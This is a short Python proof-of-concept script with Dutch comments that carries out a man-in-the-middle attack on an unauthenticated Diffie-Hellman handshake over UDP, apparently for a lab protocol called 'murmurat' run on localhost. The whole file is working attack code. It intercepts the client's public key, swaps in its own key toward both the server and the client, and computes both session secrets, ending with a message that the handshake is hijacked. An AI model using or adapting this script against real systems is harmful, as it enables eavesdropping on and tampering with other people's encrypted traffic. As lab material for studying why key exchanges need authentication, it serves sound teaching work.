# mitm_handshake_poc.py

from murmurat import *
import socket

CLIENT_LISTEN_PORT = 1400   # waar client naartoe zendt
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 1401          # server draait hier

# 1) Zet twee sockets op: één voor client, één voor server
sock_c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock_c.bind(("0.0.0.0", CLIENT_LISTEN_PORT))

sock_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("[MITM] Wacht op DH-pub van client…")
data, client_addr = sock_c.recvfrom(4096)
A_pub = int.from_bytes(data, "big")
print(f"[MITM] Ontving client DH-pub: {hex(A_pub)[:16]}…")

# 2) MITM genereert eigen DH-keys
m_priv, M_pub = dh_keygen()
M_bytes = M_pub.to_bytes(256, "big")

# 3) Stuur M_pub door naar server in plaats van A_pub
sock_s.sendto(M_bytes, (SERVER_HOST, SERVER_PORT))
print(f"[MITM] Zend valse DH-pub naar server: {hex(M_pub)[:16]}…")

# 4) Ontvang server DH-pub (B_pub)
data, _ = sock_s.recvfrom(4096)
B_pub = int.from_bytes(data, "big")
print(f"[MITM] Ontving server DH-pub: {hex(B_pub)[:16]}…")

# 5) MITM berekent beide shared secrets
#    - met client: secret_C = A_pub^m mod p
#    - met server: secret_S = B_pub^m mod p
secret_with_client = dh_shared_secret(A_pub, m_priv)
secret_with_server = dh_shared_secret(B_pub, m_priv)
print(f"[MITM] Shared secret (MITM–client): {hex(secret_with_client)[:16]}…")
print(f"[MITM] Shared secret (MITM–server): {hex(secret_with_server)[:16]}…")

# 6) Zend M_pub door naar client (in plaats van B_pub)
sock_c.sendto(M_bytes, client_addr)
print(f"[MITM] Zend valse DH-pub naar client: {hex(M_pub)[:16]}…")
print("[MITM] Handshake volledig gekaapt — MITM kent nu beide sessiesleutels.")
